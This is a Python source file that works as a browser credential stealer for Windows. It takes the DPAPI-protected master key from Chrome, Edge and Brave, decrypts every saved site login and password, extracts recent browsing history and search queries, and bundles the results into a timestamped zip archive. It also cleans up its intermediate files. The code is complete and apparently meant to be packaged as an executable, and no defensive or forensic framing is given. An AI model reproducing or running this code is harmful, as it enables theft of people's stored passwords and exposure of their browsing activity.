import os
import shutil
import sqlite3
import base64
import json
import zipfile
from urllib.parse import urlparse, parse_qs, unquote
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import pytz
import win32crypt
import sys

IST = pytz.timezone("Asia/Kolkata")

# Get directory where script or executable is running
def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

BASE_DIR = get_base_path()

def get_master_key(browser):
    state_path = os.path.join(os.environ['LOCALAPPDATA'], browser + r"\User Data\Local State")
    with open(state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(encrypted_password: bytes, master_key: bytes) -> str:
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception:
        return "[Decryption Failed]"

def extract_passwords(browser, name, output_folder, timestamp): 
    master_key = get_master_key(browser)
    login_db = os.path.join(os.environ['LOCALAPPDATA'], browser + r"\User Data\Default\Login Data")
    temp_db = os.path.join(BASE_DIR, f"{name}_login_temp.db")
    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    output_file = os.path.join(output_folder, f"{name}_passwords_{timestamp}.txt")
    with open(output_file, "w", encoding="utf-8") as f:
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, master_key)
            f.write(f"[Site] {url}\n[Username] {username}\n[Password] {decrypted_password}\n\n")
    cursor.close()
    conn.close()
    os.remove(temp_db)
    return output_file

def webkit_to_ist(webkit_time):
    try:
        epoch_start = datetime(1601, 1, 1)
        delta = timedelta(microseconds=webkit_time)
        utc_time = epoch_start + delta
        ist_time = utc_time.replace(tzinfo=pytz.utc).astimezone(IST)
        return ist_time.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "Invalid Time"

def parse_query(url):
    try:
        parsed = urlparse(url)
        queries = parse_qs(parsed.query)
        if "q" in queries:
            return unquote(queries["q"][0])
    except:
        pass
    return None

def extract_history(browser, name, output_folder, timestamp):
    history_db = os.path.join(os.environ['LOCALAPPDATA'], browser + r"\User Data\Default\History")
    temp_db = os.path.join(BASE_DIR, f"{name}_history_temp.db")
    shutil.copy2(history_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 70")

    output_file = os.path.join(output_folder, f"{name}_history_{timestamp}.txt")
    with open(output_file, "w", encoding="utf-8") as f:
        for row in cursor.fetchall():
            url, title, last_visit_time = row
            human_time = webkit_to_ist(last_visit_time)
            search = parse_query(url)
            domain = urlparse(url).netloc
            if search:
                line = f"[Search] | {human_time} | {search} | {domain}\n"
            else:
                line = f"[Visited] | {human_time} | {url.strip()} | {domain}\n"
            f.write(line)
    cursor.close()
    conn.close()
    os.remove(temp_db)
    return output_file

def zip_data(files, timestamp, output_folder):
    zip_filename = os.path.join(BASE_DIR, f"results_{timestamp}.zip")
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))
            os.remove(file)
    if os.path.isdir(output_folder):
        shutil.rmtree(output_folder)
    return zip_filename

def main():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_folder = os.path.join(BASE_DIR, "extracted_data")
    os.makedirs(output_folder, exist_ok=True)

    browsers = {
        "Google\\Chrome": "chrome",
        "Microsoft\\Edge": "edge",
        "BraveSoftware\\Brave-Browser": "brave"
    }

    all_files = []
    for path, name in browsers.items():
        try:
            pass_file = extract_passwords(path, name, output_folder, timestamp)
            hist_file = extract_history(path, name, output_folder, timestamp)
            all_files.extend([pass_file, hist_file])
        except Exception as e:
            print(f"[-] Error with {name}: {e}")

    zip_file = zip_data(all_files, timestamp, output_folder)
    print(f"[+] Final zip created: {zip_file}")

if __name__ == "__main__":
    main()